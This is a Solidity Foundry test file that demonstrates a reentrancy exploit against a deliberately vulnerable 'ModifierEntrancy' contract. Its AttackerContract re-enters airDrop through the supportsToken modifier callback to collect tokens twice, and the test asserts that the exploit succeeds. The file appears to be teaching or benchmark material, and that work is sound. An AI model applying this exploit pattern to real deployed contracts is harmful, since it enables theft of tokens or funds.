
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {ModifierEntrancy, Bank, attack} from "../src/ModifierEntrancy.sol";

contract TestReentrancyModifierEntrancy is Test {
    ModifierEntrancy public _contractUnderTest;
    AttackerContract public _attacker;

    function setUp() public {
        _contractUnderTest = new ModifierEntrancy();
        _attacker = new AttackerContract(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes() public {
        // Capture initial balance of attacker in the token contract
        uint256 initialBalance = _contractUnderTest.tokenBalance(address(_attacker));
        assertEq(initialBalance, 0, "Initial balance should be 0");

        // Trigger the attack
        _attacker.attack();

        // Verify the exploit succeeded
        // Due to reentrancy, the attacker should have more than 20 tokens
        // The airDrop function adds 20 tokens each time it's called
        // With reentrancy: first call adds 20, reentrant call adds another 20 = 40 total
        uint256 finalBalance = _contractUnderTest.tokenBalance(address(_attacker));
        
        // The exploit succeeds if the attacker got more than the intended 20 tokens
        assertTrue(finalBalance > 20, "Reentrancy attack failed: attacker should have more than 20 tokens");
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract AttackerContract {
    ModifierEntrancy public _victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    bool private _reentering;

    constructor(address victimAddress) { 
        _victim = ModifierEntrancy(victimAddress);
    }

    function attack() public {
        attackCallCount = 0;
        exploitSucceeded = false;
        _reentering = false;
        
        // Call the vulnerable airDrop function
        _victim.airDrop();
        
        // Check if reentrancy was successful (called more than once)
        if (attackCallCount > 1) {
            exploitSucceeded = true;
        }
        
        // Also verify by checking the token balance
        // If reentrancy worked, we should have more than 20 tokens
        if (_victim.tokenBalance(address(this)) > 20) {
            exploitSucceeded = true;
        }
    }

    // This function is called by the supportsToken modifier in ModifierEntrancy
    // The reentrancy happens here because the modifier calls this BEFORE updating state
    function supportsToken() external returns (bytes32) {
        attackCallCount++;
        
        // Reenter only once to avoid infinite loop
        // The hasNoBalance modifier will pass because tokenBalance is still 0
        // (state hasn't been updated yet due to modifier order)
        if (!_reentering && attackCallCount == 1) {
            _reentering = true;
            _victim.airDrop();
        }
        
        return keccak256(abi.encodePacked("Nu Token"));
    }

    receive() external payable {}
}
